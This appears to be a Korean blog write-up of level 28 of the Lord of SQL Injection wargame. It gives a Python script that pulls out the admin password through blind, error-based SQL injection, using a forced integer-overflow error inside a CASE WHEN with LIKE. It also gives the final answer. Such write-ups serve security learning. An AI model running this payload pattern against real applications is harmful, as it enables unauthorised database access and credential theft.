---
title: LOS - 28번 frankenstein
category: Lord of SQL Injection
---

# [28] frankenstein

## 문제

<img  src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FTO6uD%2FbtroQcD0xeH%2FVEz0pKlYKuQykNPh1pftgK%2Fimg.png">

## 풀이

**LoS 28번 Python 자동화 코드**이다.
```python
import requests

url = "https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php"
cookie = {"PHPSESSID":"2evml88c628kabc2j1vfk63ks9"}

print("🖤 Start SQLi...")

ans = ""
end = False

for i in range(1, 100):
    if(end==True):
        print(f">> There's No Letter {i}")
        break
    end = True
    print(f"🖤 Checking letter {i}...")
    for asc in range(48, 127):
        search = ans+chr(asc)
        payload = f"?pw=' || CASE WHEN id='admin' and pw like '{search}%25' THEN 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF ELSE 0 END %23"
        res = requests.get(url+payload, cookies=cookie)
        if("login_chk" in res.text):
            continue
        elif("error" in res.text):
            print(f">> Letter {i} → {chr(asc)}")
            ans+=chr(asc)
            end = False
            break

print(f"🖤 Answer : {ans}")
```

<img  src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fo9RVC%2FbtroQHcGsn6%2FR3hxUf6mnpVomVdHZmykK1%2Fimg.png">

그런데 여기서 끝이 아니었다.

자동화 공격 결과 분명 답은 숫자와 알파벳 **대문자**의 조합으로 나왔건만...

아무리 넣어봐도 안 풀렸다.

도저히 이유를 모르겠어서 다른 블로그 글을 찾아봤더니 답은 `0dc4efbb` 였다.

왜 아스키로 검색했는데 대소문자가 반대로 나오는지...

## 결과

<img  src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FFN907%2FbtroSuwFci1%2FkHtw4XM9KJHFkbEZAOHw6K%2Fimg.png">